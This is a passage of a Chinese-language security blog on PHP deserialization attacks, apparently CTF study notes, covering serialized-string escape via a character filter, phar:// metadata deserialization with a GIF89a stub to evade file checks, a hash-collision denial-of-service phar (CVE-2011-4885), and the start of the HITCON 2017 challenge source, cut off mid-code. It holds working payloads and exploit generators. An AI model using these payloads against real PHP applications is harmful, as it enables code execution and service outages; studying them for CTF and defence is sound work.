<p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecurelove”;s:8:”password”;s:6:”hacker”;}&amp;password=1</p>
</blockquote>
<h3 id="减少："><a href="#减少：" class="headerlink" title="减少："></a>减少：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br> <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot; rel=&quot;external nofollow&quot; &gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br> highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br> <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br> <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>extract变量覆盖,file_get_contents任意文件读取.</p>
<p>将变量$userinfo[‘img’]逆推回去发现,是由参数img_path控制的,但是经过sha1加密,我们无法得知加密后内容,但结合前面的extract变量覆盖,我们可以自己POST构造.</p>
<p>构造了之后,会经过序列化filter函数替换一些字符(那么此时序列化后的数据则发生了变化,可能存在漏洞),再反序列化,读取参数值.</p>
<p>序列化后,有三个元素,分别是img,user,function,而我们能控制的只有后面两个,我们需要构造的payload是这样的</p>
<blockquote>
<p>f”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:3:”tql”;s:3:”tql”;}</p>
</blockquote>
<p>但是不经任何改变则是这样的</p>
<blockquote>
<p>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:10:”show_image”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}</p>
</blockquote>
<p>利用截断的思想不让其读取元素img的值,我们自己来构造这个值,只有两个参数,必须在function哪里截断,而这个反序列是长度递减,那么就是选择元素吞噬(吞噬的长度自己酌情参考,一般是到自己能控制的点就好)后面的长度,来构造自己的payload咯,我们就选user元素吧,len(‘“;s:8:”function”;s:10:”‘)的长度为23,但是我们无法构造23个长度,我们可以多吞噬一个,24个字符,那么就用6个flag就好,但是这样后面的序列化就混乱了,我们就要添加自己的payload,并补全.虽然这样补好了,但是只有两个元素,这里需要三个元素,我们就再添加元素,并将后面的img进行截断</p>
<blockquote>
<p>a:3:{s:4:”user”;s:24:””;s:8:”function”;s:10:”show_image”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}<br>a:3:{s:4:”user”;s:24:””;s:8:”function”;s:2:”22”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}</p>
</blockquote>
<p> 截断只需}即可,并且不为读取的字符即可,因此添加f”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:3:”tql”;s:3:”tql”;},这里我们新增了一个元素,因此吞噬后function元素消失了,随便补充好元素即可.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<br> <span class="hljs-string">&quot;user&quot;</span>=&gt;<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>,<br> <span class="hljs-string">&quot;function&quot;</span>=&gt;<span class="hljs-string">&#x27;2&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;&#125;&#x27;</span>,<br> <span class="hljs-comment">//&quot;user&quot;=&gt;&#x27;guest&#x27;,</span><br> <span class="hljs-comment">//&quot;function&quot;=&gt;&#x27;show_image&#x27;,</span><br> <span class="hljs-string">&quot;img&quot;</span>=&gt;sha1(base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>))<br>);<br>print_r(serialize(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(filter(serialize(<span class="hljs-variable">$arr</span>)));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(unserialize(filter(serialize(<span class="hljs-variable">$arr</span>))));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="phar拓宽反序列化的攻击面"><a href="#phar拓宽反序列化的攻击面" class="headerlink" title="phar拓宽反序列化的攻击面"></a>phar拓宽反序列化的攻击面</h2><p>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。</p>
<p>一个生成phar的脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    @unlink(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-variable">$o</span>-&gt;data = <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210801184545865.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<ul>
<li>a <strong>stub</strong></li>
</ul>
<p>含有&lt;?php xxx; __HALT_COMPILER();?&gt;  以__HALT_COMPILER();?&gt;结尾</p>
<ul>
<li>a <strong>manifest</strong> describing the contents</li>
</ul>
<p>存储每个压缩文件的权限、属性等信息，还有用户自定义的meta-data以序列化后的字符串</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729113615040.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>the file <strong>contents</strong></li>
</ul>
<p>压缩文件内容</p>
<ul>
<li>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</li>
</ul>
<p>签名(可选)，位于文件尾</p>
</blockquote>
<p>利用条件</p>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<br>    file_exists(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/1.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>上面的代码其实已经存在任意代码执行了</p>
<blockquote>
<p>$o-&gt;data=<code>dir</code>;</p>
</blockquote>
<h3 id="绕过文件幻数检测"><a href="#绕过文件幻数检测" class="headerlink" title="绕过文件幻数检测"></a>绕过文件幻数检测</h3><p>恶意phar生成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//修改</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure>

<p>修改后缀为gif 然后上传</p>
<blockquote>
<p>?filename=phar://upload_file/phar.gif</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//修改</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure>

<h3 id="PHP内核哈希表碰撞攻击-CVE-2011-4885"><a href="#PHP内核哈希表碰撞攻击-CVE-2011-4885" class="headerlink" title="PHP内核哈希表碰撞攻击(CVE-2011-4885)"></a>PHP内核哈希表碰撞攻击(CVE-2011-4885)</h3><p>参考<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1350367">https://cloud.tencent.com/developer/article/1350367</a></p>
<p>在PHP内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的key使哈希表退化成单链表（时间复杂度从O(1) =&gt; O(n)）来触发拒绝服务攻击。</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/1.jpeg" srcset="/img/loading.gif" lazyload></p>
<p>PHP修复此漏洞的方式是限制通过$_GET或$_POST等方式传入的参数数量，但是如果PHP脚本通过json_decode()或unserialize()等方式获取参数，依然将受到此漏洞的威胁。</p>
<p>生成恶意phar代码 这里开始就不懂了  PHP内核探索:哈希表碰撞攻击原理<a target="_blank" rel="noopener" href="https://www.jb51.net/article/70383.htm">https://www.jb51.net/article/70383.htm</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$size</span>= pow(<span class="hljs-number">2</span>, <span class="hljs-number">16</span>);<br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$key</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$maxKey</span> = (<span class="hljs-variable">$size</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$size</span>; <span class="hljs-variable">$key</span> &lt;= <span class="hljs-variable">$maxKey</span>; <span class="hljs-variable">$key</span> += <span class="hljs-variable">$size</span>) &#123;<br>    <span class="hljs-variable">$array</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-variable">$new_obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$new_obj</span>-&gt;hacker = <span class="hljs-variable">$array</span>;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatar.phar&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;hacker.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-variable">$new_obj</span>);<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$startTime</span> = microtime(<span class="hljs-literal">true</span>);<br>file_exists(<span class="hljs-string">&quot;phar://avatar.phar&quot;</span>);<br><span class="hljs-variable">$endTime</span> = microtime(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;执行时间：  &#x27;</span>.(<span class="hljs-variable">$endTime</span> - <span class="hljs-variable">$startTime</span>). <span class="hljs-string">&#x27; 秒&#x27;</span>; <br></code></pre></td></tr></table></figure>

<h3 id="HITCON-2017-Baby-h-Master-PHP"><a href="#HITCON-2017-Baby-h-Master-PHP" class="headerlink" title="[HITCON 2017]Baby^h Master PHP"></a>[HITCON 2017]Baby^h Master PHP</h3><p>分享本题自制Dockerfile : <a target="_blank" rel="noopener" href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017">Github</a></p>
<p>这题在比赛过程是0解……真的太难了…体现了Orange大大对php和中间件的深刻理解Orz 膜拜</p>
<p>题目源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$FLAG</span> = create_function(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/read_flag`);&#x27;</span>);<br><span class="hljs-variable">$SECRET</span> = `/read_secret`;<br><span class="hljs-variable">$SANDBOX</span> = <span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>@mkdir(<span class="hljs-variable">$SANDBOX</span>);<br>@chdir(<span class="hljs-variable">$SANDBOX</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>])) &#123;<br>	<span class="hljs-variable">$data</span> = serialize(<span class="hljs-keyword">new</span> User(<span class="hljs-variable">$SANDBOX</span>));<br>	<span class="hljs-variable">$hmac</span> = hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>);<br>	setcookie(<span class="hljs-string">&quot;session-data&quot;</span>, sprintf(<span class="hljs-string">&quot;%s-----%s&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>		<span class="hljs-keyword">$this</span>-&gt;avatar = <span class="hljs-variable">$path</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>&#123;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));<br>		<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function my_function_<span class="hljs-subst">$random</span>() &#123;&quot;</span><br>			. <span class="hljs-string">&quot;  global \$FLAG; \$FLAG();&quot;</span><br>			. <span class="hljs-string">&quot;&#125;&quot;</span>);<br>		<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;lucky&quot;</span>]();<br>	&#125;<br>&#125;<br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_session</span>(<span class="hljs-params"></span>) </span>&#123;<br>	<span class="hljs-keyword">global</span> <span class="hljs-variable">$SECRET</span>;<br>	<span class="hljs-variable">$data</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>];<br>	<span class="hljs-keyword">list</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) = explode(<span class="hljs-string">&quot;-----&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">#从cookie中取出data和hmac签名</span><br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) || !is_string(<span class="hljs-variable">$data</span>) || !is_string(<span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#判空</span><br>	&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye&quot;</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (!hash_equals(hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>), <span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#判断data加密之后和hmac签名是否对应</span><br>	&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye&quot;</span>);<br>	&#125;<br><br>	<span class="hljs-variable">$data</span> = unserialize(<span class="hljs-variable">$data</span>); <span class="hljs-comment">#反序列化</span><br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>-&gt;avatar)) <span class="hljs-comment">#如果反序列化之后的data包含的类中无avatar成员,退出</span><br>	&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye Bye&quot;</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>-&gt;avatar;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span 